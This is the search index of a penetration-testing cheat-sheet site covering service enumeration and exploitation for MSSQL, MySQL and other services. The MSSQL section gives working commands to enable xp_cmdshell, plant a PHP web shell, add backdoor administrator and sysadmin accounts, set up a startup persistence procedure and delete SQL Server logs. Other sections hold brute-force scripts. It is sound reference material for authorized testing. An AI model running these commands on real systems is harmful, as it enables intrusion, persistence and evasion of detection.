{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Service Enumeration Cheat Sheets","text":"<p>Professional penetration testing reference guides for systematic service discovery and exploitation.</p>"},{"location":"#overview","title":"Overview","text":"<p>This documentation provides comprehensive cheat sheets for enumerating and exploiting various network services commonly encountered during penetration testing engagements. Each guide follows a consistent methodology covering discovery, enumeration, authentication testing, exploitation, and post-exploitation techniques.</p>"},{"location":"#methodology","title":"Methodology","text":"<p>All cheat sheets follow this proven approach:</p> <ol> <li>Discovery - Port scanning and service detection</li> <li>Enumeration - Information gathering and reconnaissance</li> <li>Authentication - Credential attacks and testing</li> <li>Exploitation - Attack execution and access gaining</li> <li>Post-Exploitation - Persistence and lateral movement</li> </ol>"},{"location":"#service-categories","title":"Service Categories","text":""},{"location":"#database-services","title":"Database Services","text":"<p>Critical database systems that often contain sensitive information and provide pathways for privilege escalation.</p> <ul> <li>MySQL - Open-source relational database management system</li> <li>MSSQL - Microsoft SQL Server for Windows environments</li> <li>Oracle TNS - Enterprise database with extensive attack surface</li> </ul>"},{"location":"#mail-services","title":"Mail Services","text":"<p>Email infrastructure services that can reveal user information and provide attack vectors.</p> <ul> <li>SMTP - Simple Mail Transfer Protocol for email transmission</li> <li>IMAP/POP3 - Email retrieval protocols for client access</li> </ul>"},{"location":"#network-services","title":"Network Services","text":"<p>Core network services that provide system information and management capabilities.</p> <ul> <li>SNMP - Simple Network Management Protocol for device monitoring</li> </ul>"},{"location":"#file-services","title":"File Services","text":"<p>Network file sharing protocols that often have misconfigurations leading to unauthorized access.</p> <ul> <li>SMB - Server Message Block protocol for Windows file sharing</li> <li>NFS - Network File System for Unix/Linux environments</li> </ul>"},{"location":"#quick-reference","title":"Quick Reference","text":"<p>Each cheat sheet includes:</p> <ul> <li>Port information - Default and alternative ports</li> <li>Discovery commands - Nmap scripts and scanning techniques</li> <li>Enumeration tools - Specialized tools for information gathering</li> <li>Authentication attacks - Credential testing and brute force techniques</li> <li>Exploitation methods - Proven attack vectors and payloads</li> <li>Post-exploitation - Techniques for maintaining access and escalation</li> </ul>"},{"location":"#getting-started","title":"Getting Started","text":"<ol> <li>Identify target services through port scanning</li> <li>Select the appropriate cheat sheet</li> <li>Follow the methodology from discovery to exploitation</li> <li>Adapt commands to your specific environment</li> </ol>"},{"location":"#tools-required","title":"Tools Required","text":"<p>Most techniques require standard penetration testing tools:</p> <ul> <li>Nmap for service discovery</li> <li>Hydra for credential attacks</li> <li>Metasploit for exploitation</li> <li>Custom scripts and utilities</li> <li>Service-specific tools (detailed in each guide)</li> </ul>"},{"location":"#disclaimer","title":"Disclaimer","text":"<p>These resources are intended for authorized penetration testing and educational purposes only. Always ensure proper authorization before testing any systems. Unauthorized access to computer systems is illegal and unethical.</p>"},{"location":"contributing/","title":"Contributing","text":"<p>Help improve these cheat sheets for the cybersecurity community.</p>"},{"location":"contributing/#how-to-contribute","title":"How to Contribute","text":"<ul> <li>New techniques and exploitation methods</li> <li>Updated commands and tool usage</li> <li>Bug fixes and error corrections</li> <li>Additional services coverage</li> </ul>"},{"location":"contributing/#quick-process","title":"Quick Process","text":"<ol> <li>Fork the repository on GitHub</li> <li>Create branch: <code>git checkout -b feature/your-feature</code></li> <li>Make changes and test commands</li> <li>Commit: <code>git commit -m \"Add new technique\"</code> </li> <li>Push: <code>git push origin feature/your-feature</code></li> <li>Create Pull Request with description</li> </ol>"},{"location":"contributing/#guidelines","title":"Guidelines","text":""},{"location":"contributing/#command-standards","title":"Command Standards","text":"<ul> <li>Test all commands before submitting</li> <li>Add clear explanations and context</li> <li>Follow existing format and style</li> <li>Include security warnings where needed</li> </ul>"},{"location":"contributing/#cheat-sheet-structure","title":"Cheat Sheet Structure","text":"<pre><code># Service Name\n## Service Information (ports, protocol)\n## Discovery (port scanning)\n## Enumeration (information gathering)\n## Authentication (credential testing)\n## Exploitation (attack vectors)\n## Post-Exploitation (persistence)\n</code></pre>"},{"location":"contributing/#testing","title":"Testing","text":"<p>Before submitting: <pre><code># Install dependencies\npip install -r requirements.txt\n\n# Test build\nmkdocs serve\n</code></pre></p> <p>Check: - [ ] Commands tested and working - [ ] MkDocs builds without errors - [ ] Formatting consistent - [ ] Links work correctly</p>"},{"location":"contributing/#recognition","title":"Recognition","text":"<p>Contributors are recognized in Git history and documentation credits.</p>"},{"location":"contributing/#community-standards","title":"Community Standards","text":"<ul> <li>Be respectful and professional</li> <li>Test all commands before submitting</li> <li>Follow established formatting</li> <li>Focus on accuracy and clarity</li> </ul> <p>Thank you for helping improve cybersecurity knowledge sharing!</p>"},{"location":"quick-start/","title":"Quick Start Guide","text":"<p>Get started with service enumeration using proven methodologies and tools.</p>"},{"location":"quick-start/#prerequisites","title":"Prerequisites","text":"<p>Ensure you have the following tools installed:</p> <pre><code># Essential tools\napt-get update\napt-get install nmap hydra smbclient nfs-common snmp\n\n# Optional but recommended\napt-get install enum4linux nbtscan onesixtyone snmp-mibs-downloader\n</code></pre>"},{"location":"quick-start/#basic-workflow","title":"Basic Workflow","text":""},{"location":"quick-start/#1-discovery-phase","title":"1. Discovery Phase","text":"<p>Start with comprehensive port scanning:</p> <pre><code># Quick scan for common ports\nnmap -sS -O -sV target\n\n# Comprehensive scan\nnmap -sS -A -O -sV -p- target\n\n# UDP scan for specific services\nnmap -sU -p 161,162,123,69 target\n</code></pre>"},{"location":"quick-start/#2-service-identification","title":"2. Service Identification","text":"<p>Identify specific services and versions:</p> <pre><code># Banner grabbing\nnmap -sV -p &lt;ports&gt; target\n\n# Script scanning\nnmap --script=default,safe -p &lt;ports&gt; target\n</code></pre>"},{"location":"quick-start/#3-enumeration","title":"3. Enumeration","text":"<p>Use service-specific enumeration techniques:</p> <pre><code># SMB enumeration\nenum4linux target\nsmbclient -L //target -N\n\n# SNMP enumeration\nonesixtyone -c community.txt target\nsnmpwalk -c public -v1 target\n\n# DNS enumeration\ndnsrecon -d domain.com\n</code></pre>"},{"location":"quick-start/#4-authentication-testing","title":"4. Authentication Testing","text":"<p>Test for weak or default credentials:</p> <pre><code># Hydra password attacks\nhydra -L users.txt -P passwords.txt service://target\n\n# Service-specific auth testing\nsmbclient //target/share -U username\n</code></pre>"},{"location":"quick-start/#common-port-reference","title":"Common Port Reference","text":"Port Service Common Tools 21 FTP nmap, hydra, ftp 22 SSH nmap, hydra, ssh 25 SMTP nmap, smtp-user-enum 53 DNS nmap, dnsrecon, dig 80/443 HTTP/HTTPS nmap, nikto, dirb 110/995 POP3 nmap, hydra 111 RPC nmap, rpcinfo 135 MSRPC nmap, rpcclient 139/445 SMB nmap, enum4linux, smbclient 143/993 IMAP nmap, hydra 161/162 SNMP nmap, onesixtyone, snmpwalk 389 LDAP nmap, ldapsearch 993/995 IMAPS/POP3S nmap, openssl 1433 MSSQL nmap, sqsh 1521 Oracle nmap, sqlplus 2049 NFS nmap, showmount 3306 MySQL nmap, mysql 5432 PostgreSQL nmap, psql"},{"location":"quick-start/#methodology-templates","title":"Methodology Templates","text":""},{"location":"quick-start/#network-reconnaissance","title":"Network Reconnaissance","text":"<pre><code># Host discovery\nnmap -sn network/24\n\n# Port discovery\nmasscan -p1-65535 target --rate=1000\n\n# Service enumeration\nnmap -sV -sC -p &lt;discovered_ports&gt; target\n</code></pre>"},{"location":"quick-start/#service-specific-testing","title":"Service-Specific Testing","text":"<p>Follow this pattern for each discovered service:</p> <ol> <li>Basic enumeration</li> <li>Version identification</li> <li>Vulnerability scanning</li> <li>Authentication testing</li> <li>Exploitation attempts</li> </ol>"},{"location":"quick-start/#documentation","title":"Documentation","text":"<p>Document findings systematically:</p> <ul> <li>Service versions and configurations</li> <li>Identified vulnerabilities</li> <li>Successful authentication attempts</li> <li>Exploitation results</li> <li>Remediation recommendations</li> </ul>"},{"location":"quick-start/#next-steps","title":"Next Steps","text":"<p>Once you've completed basic reconnaissance:</p> <ol> <li>Review service-specific cheat sheets</li> <li>Perform targeted enumeration</li> <li>Test authentication mechanisms</li> <li>Attempt exploitation</li> <li>Document all findings</li> </ol> <p>Select the appropriate cheat sheet based on discovered services to continue with detailed enumeration and exploitation techniques.</p>"},{"location":"database/","title":"Database Services","text":"<p>Database services are critical targets in penetration testing due to their potential for containing sensitive information and providing pathways for privilege escalation.</p>"},{"location":"database/#overview","title":"Overview","text":"<p>Database enumeration focuses on:</p> <ul> <li>Service discovery and version identification</li> <li>Authentication bypass and credential attacks</li> <li>Information disclosure vulnerabilities</li> <li>Privilege escalation techniques</li> <li>Data extraction methods</li> </ul>"},{"location":"database/#common-database-services","title":"Common Database Services","text":""},{"location":"database/#mysql-port-3306","title":"MySQL (Port 3306)","text":"<p>Open-source relational database management system commonly found in web applications.</p> <p>Key Attack Vectors: - Default and weak credentials - UDF (User Defined Function) exploitation - File system access via SQL queries - Binary log analysis</p> <p>View MySQL Cheat Sheet</p>"},{"location":"database/#mssql-port-1433","title":"MSSQL (Port 1433)","text":"<p>Microsoft SQL Server database commonly found in Windows environments.</p> <p>Key Attack Vectors: - xp_cmdshell command execution - Windows authentication bypass - Database link exploitation - OLE automation procedures</p> <p>View MSSQL Cheat Sheet</p>"},{"location":"database/#oracle-tns-port-1521","title":"Oracle TNS (Port 1521)","text":"<p>Enterprise database system with extensive functionality and complex security model.</p> <p>Key Attack Vectors: - SID enumeration and brute forcing - TNS listener exploitation - SYSDBA privilege escalation - PL/SQL injection vulnerabilities</p> <p>View Oracle TNS Cheat Sheet</p>"},{"location":"database/#general-methodology","title":"General Methodology","text":""},{"location":"database/#1-discovery","title":"1. Discovery","text":"<pre><code># Port scanning\nnmap -p 1433,1521,3306,5432 target\n\n# Service detection\nnmap -sV -p &lt;ports&gt; target\n</code></pre>"},{"location":"database/#2-enumeration","title":"2. Enumeration","text":"<pre><code># Banner grabbing\nnc target port\n\n# Specialized tools\nnmap --script=database-* target\n</code></pre>"},{"location":"database/#3-authentication","title":"3. Authentication","text":"<pre><code># Default credentials\nhydra -C defaults.txt service://target\n\n# Brute force attacks\nhydra -L users.txt -P passwords.txt service://target\n</code></pre>"},{"location":"database/#4-exploitation","title":"4. Exploitation","text":"<ul> <li>Leverage identified vulnerabilities</li> <li>Execute commands through database functions</li> <li>Extract sensitive information</li> <li>Escalate privileges</li> </ul>"},{"location":"database/#security-considerations","title":"Security Considerations","text":"<p>When testing database services:</p> <ul> <li>Authorization - Ensure proper testing authorization</li> <li>Data sensitivity - Be cautious with production data</li> <li>Service availability - Avoid disrupting database operations</li> <li>Logging - Be aware of extensive database logging</li> </ul>"},{"location":"database/#tools-and-resources","title":"Tools and Resources","text":""},{"location":"database/#essential-tools","title":"Essential Tools","text":"<ul> <li>nmap - Service discovery and enumeration</li> <li>hydra - Authentication attacks</li> <li>sqlmap - SQL injection testing</li> <li>Metasploit - Exploitation framework</li> </ul>"},{"location":"database/#database-specific-tools","title":"Database-Specific Tools","text":"<ul> <li>mysql - MySQL client</li> <li>sqlplus - Oracle client</li> <li>psql - PostgreSQL client</li> <li>sqsh - Sybase/MSSQL client</li> </ul> <p>Select a specific database service above to access detailed enumeration and exploitation techniques.</p>"},{"location":"database/mssql/","title":"Microsoft SQL Server (MSSQL) Enumeration","text":"<p>Microsoft SQL Server is a relational database management system commonly found in Windows environments.</p>"},{"location":"database/mssql/#service-information","title":"Service Information","text":"<p>Default Ports: 1433/tcp (default), 1434/udp (SQL Server Browser) Protocol: TCP/UDP Service: Microsoft SQL Server</p>"},{"location":"database/mssql/#discovery","title":"Discovery","text":""},{"location":"database/mssql/#port-scanning","title":"Port Scanning","text":"<pre><code># Nmap scan for MSSQL\nnmap -p 1433,1434 target\nnmap -sU -p 1434 target\n\n# Service detection\nnmap -sV -p 1433 target\nnmap -sC -p 1433 target\n\n# MSSQL scripts\nnmap --script ms-sql-info target\nnmap --script ms-sql-config target\nnmap --script ms-sql-tables target\nnmap --script ms-sql-hasdbaccess target\n</code></pre>"},{"location":"database/mssql/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code># Telnet\ntelnet target 1433\n\n# Netcat\nnc target 1433\n</code></pre>"},{"location":"database/mssql/#enumeration","title":"Enumeration","text":""},{"location":"database/mssql/#instance-discovery","title":"Instance Discovery","text":"<pre><code># SQL Server Browser (UDP 1434)\nnmap -sU -p 1434 --script ms-sql-discover target\n\n# Manual UDP query\necho -ne \"\\x02\" | nc -u target 1434\n\n# Metasploit\nuse auxiliary/scanner/mssql/mssql_ping\n</code></pre>"},{"location":"database/mssql/#version-information","title":"Version Information","text":"<pre><code># Nmap script\nnmap --script ms-sql-info target\n\n# Manual query\nsqlcmd -S target -Q \"SELECT @@version\"\n</code></pre>"},{"location":"database/mssql/#authentication","title":"Authentication","text":""},{"location":"database/mssql/#default-credentials","title":"Default Credentials","text":"<pre><code>Common defaults:\n- sa / (blank)\n- sa / sa\n- sa / password\n- MSSQL / password\n- sql / password\n</code></pre>"},{"location":"database/mssql/#password-attacks","title":"Password Attacks","text":"<pre><code># Hydra\nhydra -l sa -P passwords.txt mssql://target\nhydra -L users.txt -P passwords.txt mssql://target\n\n# Medusa\nmedusa -h target -u sa -P passwords.txt -M mssql\n\n# Ncrack\nncrack -p 1433 --user sa -P passwords.txt target\n</code></pre>"},{"location":"database/mssql/#windows-authentication","title":"Windows Authentication","text":"<pre><code># Using domain credentials\nsqlcmd -S target -E\nsqlcmd -S target -U domain\\user -P password\n\n# Impacket\nimpacket-mssqlclient domain/user:password@target\nimpacket-mssqlclient domain/user:password@target -windows-auth\n</code></pre>"},{"location":"database/mssql/#exploitation","title":"Exploitation","text":""},{"location":"database/mssql/#command-execution","title":"Command Execution","text":""},{"location":"database/mssql/#xp_cmdshell","title":"xp_cmdshell","text":"<pre><code>-- Enable xp_cmdshell\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n\n-- Execute commands\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'dir C:\\';\nEXEC xp_cmdshell 'net user';\n\n-- Disable xp_cmdshell\nEXEC sp_configure 'xp_cmdshell', 0;\nRECONFIGURE;\n</code></pre>"},{"location":"database/mssql/#sp_oacreate-ole-automation","title":"sp_OACreate (OLE Automation)","text":"<pre><code>-- Enable OLE Automation\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'Ole Automation Procedures', 1;\nRECONFIGURE;\n\n-- Execute commands\nDECLARE @myshell INT;\nEXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;\nEXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo test &gt; C:\\temp\\test.txt\"';\n</code></pre>"},{"location":"database/mssql/#file-operations","title":"File Operations","text":""},{"location":"database/mssql/#reading-files","title":"Reading Files","text":"<pre><code>-- Using OPENROWSET\nSELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS Contents;\n\n-- Using xp_cmdshell\nEXEC xp_cmdshell 'type C:\\Windows\\System32\\drivers\\etc\\hosts';\n</code></pre>"},{"location":"database/mssql/#writing-files","title":"Writing Files","text":"<pre><code>-- Using BCP\nEXEC xp_cmdshell 'bcp \"SELECT ''&lt;?php system($_GET[\\\"c\\\"]); ?&gt;''\" queryout C:\\inetpub\\wwwroot\\shell.php -c -T';\n\n-- Using xp_cmdshell\nEXEC xp_cmdshell 'echo ^&lt;?php system($_GET[\"c\"]); ?^&gt; &gt; C:\\inetpub\\wwwroot\\shell.php';\n</code></pre>"},{"location":"database/mssql/#database-links","title":"Database Links","text":"<pre><code>-- List linked servers\nEXEC sp_linkedservers;\nSELECT * FROM sys.servers;\n\n-- Query linked server\nSELECT * FROM OPENQUERY(\"LINKEDSERVER\", 'SELECT @@version');\n\n-- Execute on linked server\nEXEC ('SELECT @@version') AT LINKEDSERVER;\n</code></pre>"},{"location":"database/mssql/#post-exploitation","title":"Post-Exploitation","text":""},{"location":"database/mssql/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"database/mssql/#database-roles","title":"Database Roles","text":"<pre><code>-- Check current user\nSELECT SYSTEM_USER, USER_NAME(), USER;\n\n-- Check database roles\nSELECT IS_SRVROLEMEMBER('sysadmin');\nSELECT IS_SRVROLEMEMBER('dbcreator');\nSELECT IS_SRVROLEMEMBER('bulkadmin');\n\n-- Add user to sysadmin role\nEXEC sp_addsrvrolemember 'user', 'sysadmin';\n</code></pre>"},{"location":"database/mssql/#service-account","title":"Service Account","text":"<pre><code>-- Check service account\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'whoami /priv';\n\n-- If running as SYSTEM/high privilege account\nEXEC xp_cmdshell 'net user hacker password123 /add';\nEXEC xp_cmdshell 'net localgroup administrators hacker /add';\n</code></pre>"},{"location":"database/mssql/#data-extraction","title":"Data Extraction","text":"<pre><code>-- List databases\nSELECT name FROM sys.databases;\n\n-- List tables\nSELECT table_name FROM information_schema.tables;\n\n-- Extract data\nSELECT * FROM database.dbo.users;\nSELECT username, password FROM database.dbo.users;\n</code></pre>"},{"location":"database/mssql/#persistence","title":"Persistence","text":""},{"location":"database/mssql/#create-backdoor-user","title":"Create Backdoor User","text":"<pre><code>-- Create SQL user\nCREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123';\nEXEC sp_addsrvrolemember 'backdoor', 'sysadmin';\n</code></pre>"},{"location":"database/mssql/#startup-stored-procedures","title":"Startup Stored Procedures","text":"<pre><code>-- Create startup procedure\nUSE master;\nGO\nCREATE PROCEDURE sp_backdoor\nAS\nEXEC xp_cmdshell 'powershell -enc &lt;base64_payload&gt;';\nGO\n\n-- Mark as startup procedure\nEXEC sp_procoption 'sp_backdoor', 'startup', 'on';\n</code></pre>"},{"location":"database/mssql/#tools","title":"Tools","text":""},{"location":"database/mssql/#command-line-clients","title":"Command Line Clients","text":"<pre><code># sqlcmd (Windows)\nsqlcmd -S target -U sa -P password\n\n# sqsh (Linux)\nsqsh -S target -U sa -P password\n\n# Impacket mssqlclient\nimpacket-mssqlclient sa:password@target\n</code></pre>"},{"location":"database/mssql/#gui-tools","title":"GUI Tools","text":"<ul> <li>SQL Server Management Studio (SSMS)</li> <li>Azure Data Studio</li> <li>DBeaver</li> <li>HeidiSQL</li> </ul>"},{"location":"database/mssql/#metasploit-modules","title":"Metasploit Modules","text":"<pre><code># Scanner modules\nuse auxiliary/scanner/mssql/mssql_login\nuse auxiliary/scanner/mssql/mssql_ping\nuse auxiliary/scanner/mssql/mssql_hasdbaccess\nuse auxiliary/scanner/mssql/mssql_enum\n\n# Admin modules\nuse auxiliary/admin/mssql/mssql_enum\nuse auxiliary/admin/mssql/mssql_exec\nuse auxiliary/admin/mssql/mssql_enum_sql_logins\n</code></pre>"},{"location":"database/mssql/#security-considerations","title":"Security Considerations","text":""},{"location":"database/mssql/#common-vulnerabilities","title":"Common Vulnerabilities","text":"<ul> <li>Default credentials (sa account)</li> <li>Weak passwords</li> <li>Excessive privileges</li> <li>Enabled xp_cmdshell</li> <li>SQL injection vulnerabilities</li> <li>Unpatched instances</li> </ul>"},{"location":"database/mssql/#detection-evasion","title":"Detection Evasion","text":"<pre><code>-- Disable SQL Server logs\nEXEC sp_cycle_errorlog;\nEXEC xp_cmdshell 'del C:\\Program Files\\Microsoft SQL Server\\MSSQL*\\MSSQL\\LOG\\ERRORLOG*';\n\n-- Clear command history\nEXEC xp_cmdshell 'powershell Clear-History';\n</code></pre>"},{"location":"database/mssql/#defensive-measures","title":"Defensive Measures","text":"<ul> <li>Disable unnecessary features (xp_cmdshell, OLE Automation)</li> <li>Use Windows Authentication</li> <li>Implement least privilege</li> <li>Regular security updates</li> <li>Monitor SQL Server logs</li> <li>Network segmentation</li> </ul>"},{"location":"database/mssql/#references","title":"References","text":"<ul> <li>MSSQL Red Team Cheat Sheet</li> <li>HackTricks MSSQL</li> <li>OWASP SQL Injection</li> </ul>"},{"location":"database/mysql/","title":"MySQL Enumeration Cheat Sheet","text":""},{"location":"database/mysql/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Overview</li> <li>Ports &amp; Protocols</li> <li>Quick Discovery</li> <li>Essential Enumeration Workflow</li> <li>Service Detection</li> <li>Authentication Testing</li> <li>Database Enumeration</li> <li>Data Extraction</li> <li>Manual Interaction</li> <li>Basic MySQL Commands</li> <li>Database Exploration</li> <li>Information Schema Queries</li> <li>Credential Attacks</li> <li>Advanced Techniques</li> <li>Configuration Analysis</li> <li>Common Vulnerabilities</li> <li>Quick Reference Commands</li> <li>Testing Checklist</li> <li>Critical Security Issues</li> </ol>"},{"location":"database/mysql/#overview","title":"Overview","text":"<p>MySQL is an open-source relational database management system (RDBMS) developed by Oracle. It's widely used in web applications, particularly in LAMP (Linux, Apache, MySQL, PHP) and LEMP (Linux, Nginx, MySQL, PHP) stacks, making it a common target during penetration testing.</p>"},{"location":"database/mysql/#key-functions","title":"Key Functions","text":"<ul> <li>Data Storage: Structured data storage in tables with rows and columns</li> <li>User Management: Authentication and authorization systems</li> <li>Query Processing: SQL command execution and data retrieval</li> <li>Network Access: Client-server architecture with network connectivity</li> <li>Transaction Management: ACID compliance and data integrity</li> </ul>"},{"location":"database/mysql/#why-mysql-matters-in-pentesting","title":"Why MySQL Matters in Pentesting","text":"<ul> <li>Credential Exposure: Weak or default passwords are common</li> <li>Information Disclosure: Database contents reveal sensitive information</li> <li>Privilege Escalation: Database access can lead to system compromise</li> <li>Configuration Issues: Misconfigurations expose databases externally</li> <li>Web Application Integration: Often contains user credentials and application data</li> </ul>"},{"location":"database/mysql/#common-attack-vectors","title":"Common Attack Vectors","text":"<ul> <li>Weak Authentication: Default or weak passwords</li> <li>Network Exposure: Database accessible from external networks</li> <li>Privilege Abuse: Overprivileged database users</li> <li>Information Disclosure: Sensitive data in databases</li> <li>Configuration Exploitation: Insecure MySQL settings</li> </ul>"},{"location":"database/mysql/#ports-protocols","title":"Ports &amp; Protocols","text":"<pre><code>3306/tcp - MySQL Database (default)\n33060/tcp - MySQL X Protocol (MySQL 8.0+)\n</code></pre>"},{"location":"database/mysql/#mysql-versions","title":"MySQL Versions","text":"Version Key Features Security Notes MySQL 5.x Traditional MySQL Legacy authentication MySQL 8.0+ Enhanced security, X Protocol Modern authentication plugins MariaDB MySQL fork Enhanced security features"},{"location":"database/mysql/#quick-discovery","title":"Quick Discovery","text":"<pre><code># Port scan for MySQL\nnmap -p 3306,33060 --open -sV target\n\n# MySQL-specific scripts\nnmap -p 3306 --script=mysql-* target\n\n# Service version detection\nnmap -p 3306 -sV --script=mysql-info target\n</code></pre>"},{"location":"database/mysql/#essential-enumeration-workflow","title":"Essential Enumeration Workflow","text":""},{"location":"database/mysql/#1-service-detection","title":"1. Service Detection","text":""},{"location":"database/mysql/#basic-mysql-detection","title":"Basic MySQL Detection","text":"<pre><code># Port and version detection\nnmap -p 3306 -sV target\n\n# MySQL banner grabbing\nnmap -p 3306 --script=mysql-info target\n\n# Check for MySQL X Protocol\nnmap -p 33060 -sV target\n</code></pre>"},{"location":"database/mysql/#service-information-gathering","title":"Service Information Gathering","text":"<pre><code># Comprehensive MySQL scan\nnmap -p 3306 --script=mysql-info,mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-users,mysql-variables target\n\n# SSL/TLS detection\nnmap -p 3306 --script=ssl-cert,ssl-enum-ciphers target\n</code></pre>"},{"location":"database/mysql/#2-authentication-testing","title":"2. Authentication Testing","text":""},{"location":"database/mysql/#default-credentials-testing","title":"Default Credentials Testing","text":"<pre><code># Common default credentials\nmysql -u root -h target                    # No password\nmysql -u root -p -h target                 # Prompt for password\nmysql -u admin -padmin -h target           # admin:admin\nmysql -u mysql -pmysql -h target           # mysql:mysql\nmysql -u test -ptest -h target             # test:test\n\n# Database-specific defaults\nmysql -u wordpress -pwordpress -h target   # WordPress defaults\nmysql -u joomla -pjoomla -h target         # Joomla defaults\n</code></pre>"},{"location":"database/mysql/#empty-password-testing","title":"Empty Password Testing","text":"<pre><code># Test for empty passwords\nnmap -p 3306 --script=mysql-empty-password target\n\n# Manual empty password testing\nmysql -u root -h target\nmysql -u admin -h target\nmysql -u mysql -h target\nmysql -u user -h target\n</code></pre>"},{"location":"database/mysql/#3-database-enumeration","title":"3. Database Enumeration","text":""},{"location":"database/mysql/#database-discovery","title":"Database Discovery","text":"<pre><code># Once authenticated, list databases\nmysql -u root -ppassword -h target -e \"SHOW DATABASES;\"\n\n# Alternative method\nmysql -u root -ppassword -h target\n&gt; SHOW DATABASES;\n</code></pre>"},{"location":"database/mysql/#table-enumeration","title":"Table Enumeration","text":"<pre><code># List tables in specific database\nmysql -u root -ppassword -h target -e \"USE database_name; SHOW TABLES;\"\n\n# Get table structure\nmysql -u root -ppassword -h target -e \"USE database_name; DESCRIBE table_name;\"\n</code></pre>"},{"location":"database/mysql/#4-data-extraction","title":"4. Data Extraction","text":""},{"location":"database/mysql/#sensitive-data-discovery","title":"Sensitive Data Discovery","text":"<pre><code># Extract user data\nmysql -u root -ppassword -h target -e \"SELECT * FROM mysql.user;\"\n\n# Search for specific data\nmysql -u root -ppassword -h target -e \"SELECT * FROM database.users WHERE username LIKE '%admin%';\"\n\n# Extract password hashes\nmysql -u root -ppassword -h target -e \"SELECT User, authentication_string FROM mysql.user;\"\n</code></pre>"},{"location":"database/mysql/#manual-interaction","title":"Manual Interaction","text":""},{"location":"database/mysql/#basic-mysql-commands","title":"Basic MySQL Commands","text":""},{"location":"database/mysql/#connection-and-authentication","title":"Connection and Authentication","text":"<pre><code># Connect with credentials\nmysql -u username -ppassword -h target_ip\n\n# Connect to specific database\nmysql -u username -ppassword -h target_ip database_name\n\n# Connect with port specification\nmysql -u username -ppassword -h target_ip -P 3306\n</code></pre>"},{"location":"database/mysql/#basic-information-gathering","title":"Basic Information Gathering","text":"<pre><code>-- Show MySQL version\nSELECT version();\n\n-- Show current user\nSELECT user();\n\n-- Show current database\nSELECT database();\n\n-- Show system variables\nSHOW VARIABLES;\n\n-- Show process list\nSHOW PROCESSLIST;\n\n-- Show user privileges\nSHOW GRANTS;\n</code></pre>"},{"location":"database/mysql/#database-exploration","title":"Database Exploration","text":""},{"location":"database/mysql/#database-and-table-operations","title":"Database and Table Operations","text":"<pre><code>-- List all databases\nSHOW DATABASES;\n\n-- Select database\nUSE database_name;\n\n-- List tables in current database\nSHOW TABLES;\n\n-- Show table structure\nDESCRIBE table_name;\nSHOW COLUMNS FROM table_name;\n\n-- Show table creation statement\nSHOW CREATE TABLE table_name;\n</code></pre>"},{"location":"database/mysql/#data-retrieval","title":"Data Retrieval","text":"<pre><code>-- Select all data from table\nSELECT * FROM table_name;\n\n-- Limit results\nSELECT * FROM table_name LIMIT 10;\n\n-- Search for specific data\nSELECT * FROM users WHERE username = 'admin';\n\n-- Search for patterns\nSELECT * FROM users WHERE username LIKE '%admin%';\nSELECT * FROM users WHERE email LIKE '%@admin.%';\n</code></pre>"},{"location":"database/mysql/#information-schema-queries","title":"Information Schema Queries","text":""},{"location":"database/mysql/#system-information","title":"System Information","text":"<pre><code>-- Database information\nSELECT SCHEMA_NAME FROM information_schema.SCHEMATA;\n\n-- Table information\nSELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;\n\n-- Column information\nSELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE \nFROM information_schema.COLUMNS \nWHERE TABLE_SCHEMA = 'database_name';\n\n-- User information\nSELECT User, Host FROM mysql.user;\n</code></pre>"},{"location":"database/mysql/#privilege-information","title":"Privilege Information","text":"<pre><code>-- Show user privileges\nSELECT * FROM mysql.user;\n\n-- Show database privileges\nSELECT * FROM mysql.db;\n\n-- Show table privileges\nSELECT * FROM mysql.tables_priv;\n\n-- Show column privileges\nSELECT * FROM mysql.columns_priv;\n</code></pre>"},{"location":"database/mysql/#credential-attacks","title":"Credential Attacks","text":""},{"location":"database/mysql/#brute-force-attacks","title":"Brute Force Attacks","text":""},{"location":"database/mysql/#hydra","title":"Hydra","text":"<pre><code># MySQL brute force\nhydra -L users.txt -P passwords.txt mysql://target\n\n# Single user, multiple passwords\nhydra -l root -P passwords.txt mysql://target\n\n# Multiple users, single password\nhydra -L users.txt -p password mysql://target\n\n# Custom port\nhydra -L users.txt -P passwords.txt mysql://target:3306\n</code></pre>"},{"location":"database/mysql/#medusa","title":"Medusa","text":"<pre><code># MySQL brute force with Medusa\nmedusa -h target -U users.txt -P passwords.txt -M mysql\n\n# Single user attack\nmedusa -h target -u root -P passwords.txt -M mysql\n\n# Verbose output\nmedusa -h target -U users.txt -P passwords.txt -M mysql -v 4\n</code></pre>"},{"location":"database/mysql/#custom-script-attack","title":"Custom Script Attack","text":"<pre><code># MySQL brute force script\n#!/bin/bash\nusers=(\"root\" \"admin\" \"mysql\" \"user\" \"test\")\npasswords=(\"\" \"root\" \"admin\" \"mysql\" \"password\" \"123456\")\n\nfor user in \"${users[@]}\"; do\n    for pass in \"${passwords[@]}\"; do\n        echo \"Testing $user:$pass\"\n        mysql -u $user -p$pass -h target -e \"SELECT 1;\" 2&gt;/dev/null &amp;&amp; echo \"[+] Success: $user:$pass\"\n    done\ndone\n</code></pre>"},{"location":"database/mysql/#nmap-authentication-scripts","title":"Nmap Authentication Scripts","text":"<pre><code># MySQL brute force with Nmap\nnmap -p 3306 --script=mysql-brute --script-args userdb=users.txt,passdb=passwords.txt target\n\n# MySQL empty password check\nnmap -p 3306 --script=mysql-empty-password target\n\n# MySQL user enumeration\nnmap -p 3306 --script=mysql-enum 